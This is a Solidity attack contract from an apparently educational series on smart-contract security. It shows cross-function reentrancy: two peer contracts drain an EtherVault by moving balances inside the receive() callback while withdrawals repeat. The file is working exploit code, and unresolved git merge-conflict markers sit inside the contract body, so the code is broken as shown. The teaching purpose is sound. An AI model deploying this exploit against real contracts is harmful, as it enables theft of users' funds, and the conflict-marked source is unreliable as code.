// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-smart-contract-security-by-example-04-cross-function-reentrancy-de9cbce0558e
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-04-cross-function-reentrancy/

pragma solidity 0.8.13;

interface IEtherVault {
    function deposit() external payable;
    function transfer(address _to, uint256 _amount) external;
    function withdrawAll() external;
    function getUserBalance(address _user) external view returns (uint256);
} 

contract Attack {
<<<<<<< HEAD

        event Received(uint256 amount, uint256 balance);


=======
>>>>>>> dd2a2cd (Docs: README.md 수정)
    IEtherVault public immutable etherVault;
    Attack public attackPeer;

    constructor(IEtherVault _etherVault) {
        etherVault = _etherVault;
    }

    function setAttackPeer(Attack _attackPeer) external {
        attackPeer = _attackPeer;
    }
    
<<<<<<< HEAD
      
=======
>>>>>>> dd2a2cd (Docs: README.md 수정)
    receive() external payable {
        if (address(etherVault).balance >= 1 ether) {
            etherVault.transfer(
                address(attackPeer), 
                etherVault.getUserBalance(address(this))
            );
        }
    }
<<<<<<< HEAD
=======

>>>>>>> dd2a2cd (Docs: README.md 수정)
    function attackInit() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        etherVault.deposit{value: 1 ether}();
        etherVault.withdrawAll();
    }

    function attackNext() external {
        etherVault.withdrawAll();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}